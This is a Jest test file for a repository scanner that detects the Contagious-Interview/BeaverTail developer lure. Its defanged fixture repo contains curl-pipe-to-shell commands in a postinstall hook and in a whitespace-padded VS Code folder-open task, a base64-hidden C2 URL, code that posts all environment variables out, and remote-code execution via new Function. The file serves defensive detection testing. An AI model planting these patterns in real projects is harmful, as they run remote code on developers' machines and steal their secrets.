import { Verdict } from '../models/enums';
import { selfScan, type RepoFiles } from './self-scan';

// Build a RepoFiles from an in-memory path→content map (no network, no disk).
function repo(map: Record<string, string>): RepoFiles {
    return { paths: Object.keys(map), read: async (p) => map[p] ?? null };
}

const b64 = (s: string) => Buffer.from(s, 'utf8').toString('base64');

describe('selfScan — Contagious-Interview / BeaverTail lure', () => {
    // A defanged repo carrying the lure's signature behaviours across its own files.
    const malicious = repo({
        'package.json': JSON.stringify({
            name: 'platform-mvp',
            main: 'src/index.js',
            scripts: {
                prepare: 'node server/server.js', // benign-looking, auto-runs project code
                postinstall: "curl http://evil.example.invalid/i | sh", // overtly malicious
                build: 'react-scripts build',
            },
        }),
        '.vscode/tasks.json': `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "env",
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "silent", "echo": false },
      "osx": {
                                                                          "command": "curl -L 'https://vscode-settings-x.example.invalid/api/settings/mac' | bash"
      }
    }
  ]
}`,
        '.vscode/settings.json': `{ "files.autoSave": "afterDelay", "editor.wordWrap": "off", "security.workspace.trust.enabled": false }`,
        '.env': `NODE_ENV=development\nAUTH_API=${b64('https://ip-checking-x.example.invalid/api')}\n`,
        'server/controllers/auth.js': `const axios = require('axios');\naxios.post(api, { ...process.env }, { headers: { 'x-app-request': 'ip-check' } });`,
        'server/routes/api/auth.js': `function v(response){ const executor = new Function("require", response.data); executor(require); }`,
        'src/index.js': `export const add = (a, b) => a + b;`,
    });

    it('returns MALICIOUS', async () => {
        const r = await selfScan(malicious);
        expect(r.worst).toBe(Verdict.MALICIOUS);
    });

    it('flags the folder-open auto-exec task as CRITICAL', async () => {
        const r = await selfScan(malicious);
        const t = r.findings.find((f) => f.label.includes('folder is opened'));
        expect(t?.severity).toBe('CRITICAL');
    });

    it('detects the whitespace-padding concealment in tasks.json', async () => {
        const r = await selfScan(malicious);
        expect(r.findings.some((f) => f.label.includes('whitespace padding'))).toBe(true);
    });

    it('decodes the base64 C2 URL hidden in .env', async () => {
        const r = await selfScan(malicious);
        const env = r.findings.find((f) => f.kind === 'env_secret');
        expect(env?.detail).toContain('ip-checking-x.example.invalid');
    });

    it('flags process.env exfiltration, but not a lone new Function in source', async () => {
        const r = await selfScan(malicious);
        expect(r.findings.some((f) => /environment variables/.test(f.label))).toBe(true);
        // A bare new Function / eval in source is normal app code — not a risk on its own.
        expect(r.findings.some((f) => /Function\(\) constructor/.test(f.label))).toBe(false);
    });

    it('flags the auto-running lifecycle hook', async () => {
        const r = await selfScan(malicious);
        expect(r.findings.some((f) => f.kind === 'install_hook' && f.label.includes('prepare'))).toBe(true);
    });

    it('produces a developer-facing explanation naming the campaign', async () => {
        const r = await selfScan(malicious);
        expect(r.what.join(' ')).toMatch(/Contagious Interview/i);
    });

    it('does NOT false-positive on a legit project (vendored toolchain, fetch, templating)', async () => {
        // The shapes that wrongly flagged real repos (Twenty CRM / Yarn): vendored .yarn bundle using
        // new Function, app code calling fetch(), and a template helper using new Function.
        const legit = repo({
            'package.json': JSON.stringify({ name: 'app', scripts: { build: 'tsc', prepare: 'husky' } }),
            '.yarn/releases/yarn-4.9.2.cjs': 'var x = new Function("a", "return eval(a)");',
            'packages/x/.yarn/releases/yarn-4.9.2.cjs': 'new Function(s, body);',
            'src/api.ts': `export async function load() { const r = await fetch('https://api.example.com/v1/data'); return r.json(); }`,
            'src/template.ts': `export const compile = (src: string) => new Function('ctx', src);`,
        });
        const r = await selfScan(legit);
        expect(r.worst).toBe(Verdict.SAFE);
        expect(r.what).toHaveLength(0); // no alarming narrative
        expect(r.findings.some((f) => f.file.includes('.yarn'))).toBe(false); // vendored toolchain skipped
        expect(r.findings.some((f) => /outbound HTTP/i.test(f.label))).toBe(false); // fetch() is normal
        expect(r.findings.some((f) => /Function\(\) constructor/.test(f.label))).toBe(false); // templating is normal
    });

    it('returns SAFE with no findings for a clean repo', async () => {
        const clean = repo({
            'package.json': JSON.stringify({ name: 'clean', scripts: { build: 'tsc', test: 'jest' } }),
            '.vscode/settings.json': `{ "editor.tabSize": 2 }`,
            'src/index.js': `export const add = (a, b) => a + b;`,
            'src/util.js': `module.exports = { upper: (s) => s.toUpperCase() };`,
        });
        const r = await selfScan(clean);
        expect(r.worst).toBe(Verdict.SAFE);
        expect(r.findings).toHaveLength(0);
        expect(r.what).toHaveLength(0);
    });
});
